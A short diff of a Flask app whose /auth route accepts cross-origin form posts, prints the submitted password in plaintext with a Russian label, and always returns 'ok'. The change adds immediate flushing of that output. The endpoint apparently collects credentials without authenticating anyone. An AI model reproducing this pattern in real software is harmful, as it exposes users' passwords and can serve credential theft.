@@ -15,7 +15,7 @@ CORS(app)
 def auth():
     data = request.form
     password = data.get('password')
-    print(f"🔐 Пароль: {password}")
+    print(f"🔐 Пароль: {password}", flush=True)
     return jsonify({"status": "ok"})
 
 @app.route("/")
